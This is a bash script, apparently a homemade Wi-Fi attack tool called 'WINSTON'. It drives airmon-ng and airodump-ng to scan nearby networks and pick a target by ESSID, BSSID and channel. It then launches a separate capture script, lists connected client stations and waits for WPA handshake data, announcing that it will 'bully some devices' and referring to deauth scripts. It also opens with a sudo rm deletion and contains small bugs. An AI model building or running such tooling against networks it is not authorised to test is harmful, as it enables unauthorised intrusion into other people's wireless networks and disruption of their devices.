#!/bin/bash
# start this at home
# add password requirements later
sudo rm /winston/kenel/*

while true; 
do
    clear
    echo "please enter your username and password"
    read -p "username: " username
    if ! ls /winston/$username &>/dev/null; then
        echo "I'm sorry, this user doesn't exist on this device."
    elif ls /winston/$username &>/dev/null; then
        read -sp "password: " password
        if [[ $(echo -n "$password" | sha256sum | awk {'print $1'}) = $(cat /winston/$username/user.profile | awk '/password/ {print $2}') ]]; then
            echo " "
            echo "WINSTON: WELCOME."
            clear
            break
        fi
    fi
done

processes="$(sudo airmon-ng check | sed -n '/Name/,$p' | awk {'print $2'} | grep -v Name | grep -v '^[[:space:]]*$')"
num_processes=$(echo "$processes" | wc -l)

if [[ $((num_processes)) -ne 0 ]]; then
    sudo airmon-ng check kill &>/dev/null
fi
if iwconfig 2>/dev/null | grep "Mode:Monitor"; then
    interface=$(iwconfig 2>/dev/null | grep -B 1 "Mode:Monitor" | awk {'print $1'} | head -n 1)
else
    names=$(sudo airmon-ng | awk '/phy/ {print $4, $5}')
    interfaces=$(sudo airmon-ng | awk '/phy/ {print $2}')
    lines=$(echo "$interfaces" | wc -l)
    echo "WINSTON: HERE ARE YOUR INTERFACE OPTIONS. PLEASE PICK WIRELESS INTERFACE THAT YOU'D LIKE TO USE TO SCAN FOR NETWORKS
"
    for i in $(seq 1 $lines); do
        interface=$(echo "$interfaces" | sed -n ${i}p)
        name=$(echo "$names" | sed -n ${i}p)
        echo "$interface: $name"
    done
    echo " "
    read -p "$username: " option
    interface=$(echo "$interfaces" | grep $option)
fi
if ! ls /winston/kenel; then
    sudo mkdir /winston/kenel
fi

sudo airodump-ng $interface -w /winston/kenel/airodump-ng --write-interval 1 --output-format csv &>/dev/null &

through=1
through=$(($through))

while true; do
    if [[ $through -gt 1 ]]; then
        clear
        echo "WINSTON: HERE'S YOUR OPTIONS
    "
        echo "$(cat /winston/kenel/airodump-ng-01.csv | awk {'print $19'} | grep -oe '[A-Za-z0-9:_-]\+' | grep -v IP)" > /winston/kenel/network_options.txt
        options=/winston/kenel/network_options.txt
        lines=$(cat $options | wc -l 2>/dev/null)
        for i in $(seq 1 $(($lines+1))); do
            if [[ $i -eq $(($lines + 1)) ]]; then
                echo "[$i] refresh"
            else
                echo "[$i] $(cat $options | sed -n ${i}p)"
            fi
        done
        echo "WINSTON: PLEASE PICK AN OPTION
        "
        read -p "$username: " line
        line=$(($line))
        if [[ $line -ge 1 && $line -lt $(($lines + 1)) ]]; then
            option=$(cat $options | sed -n ${line}p)
            name="$(cat /winston/kenel/airodump-ng-01.csv | grep $option | awk {'print $19'} | grep -oe '[A-Za-z0-9:_-]\+')"
            break
        elif [ $line -eq $(($lines + 1)) ]; then
            echo "WINSTON: PLEASE WAIT
        "
            sleep 10
            continue
        fi
        break
    elif [[ $through -eq 1 ]]; then
        echo "WINSTON: INITIALIZING
        "
        through=$(($through + 1))
        sleep 5s
        continue
    fi
done

dump=/winston/kenel/airodump-ng-01.csv

essid=$(cat $dump | grep $name | head -n 1 | awk {'print $19'} | grep -oe '[A-Za-z0-9:_-]\+')
bssid=$(cat $dump | grep $name | head -n 1 | awk {'print $1'} | grep -oe '[A-Z0-9_:]\+')
channel=$(cat $dump | grep $name | head -n 1 | awk {'print $6'} | grep -oe '[0-9]\+')

pid=$(pstree -p | grep airodump-ng | grep -v capture | grep -v deauth | grep -oe '[0-9]\+')
sudo kill -9 $pid &>/dev/null
clear

echo "name: $essid
ssid: $bssid
channel: $channel
interface: $interface" > /winston/kenel/network_settings

if ! screen -ls | grep capture 2>/dev/null; then
    screen -dmS capture ./capture.sh &
elif screen -ls | grep capture 2>/dev/null; then
    screen kill $(screen -ls | grep capture | awk {'print $1'} | grep -oe '[0-9]\+') &>/dev/null
    clear
fi

echo "WINSTON: PLEASE WAIT WHILE WE PREPARE TO BULLY SOME DEVICES.
"

while true; do
    sleep 5s
    if ! cat /winston/kenel/psk-01.csv | grep -A 100 Station | grep -v Station | awk {'print $1'} | grep -oe '[A-F0-9:]\+'; then
        clear
        echo "WINSTON: PLEASE WAIT
        "
    elif cat /winston/kenel/psk-01.csv | grep -A 100 Station | grep -v Station | awk {'print $1'} | grep -oe '[0-9aA-F:]\+'; then
        doptions=$(cat /winston/kenel/psk-01.csv | grep -A 100 Station | grep -v Station | awk {'print $1'} | grep -oe '[A-Z0-9:]\+')
        echo "$doptions"
        echo "$dtoptions" > /winston/kenel/device_options
        break
    fi
done

while true; do
    if cat /winston/kenel/psk-01.csv | awk -F, '$6 ~ /WPA/ {print $1}' | grep -E "^[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}"; then
        pid=$(screen -ls | grep "(" | awk {'print $1'} | grep -oe '[0-9]\+')
        screen kill $pid
        echo "we got it"
        break
    else
        continue
    fi
done

#begin solving problem with capture and deauth scripts
